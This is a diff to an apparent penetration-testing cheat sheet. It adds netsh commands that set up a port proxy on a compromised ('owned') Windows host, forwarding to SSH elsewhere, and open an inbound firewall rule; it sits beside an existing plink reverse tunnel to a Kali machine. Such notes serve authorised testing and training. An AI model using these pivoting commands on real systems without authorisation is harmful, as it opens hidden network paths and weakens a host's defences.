@@ -99,6 +99,12 @@ Using plink:
 plink.exe -ssh -l kali -pw $KALI_PASSWORD -R 127.0.0.1:$KALI_PORT:127.0.0.1:$LOCAL_PORT $KALI_IP
 ```
 
+using netsh:
+```powershell
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$OWNED_IP connectport=22 connectaddress=$FORWARD_IP
+netsh interface portproxy show all
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=$OWNED_IP localport=$LISTEN_PORT action=allow
+```
 Using SOCAT to send file:
 ---
 On receiving machine
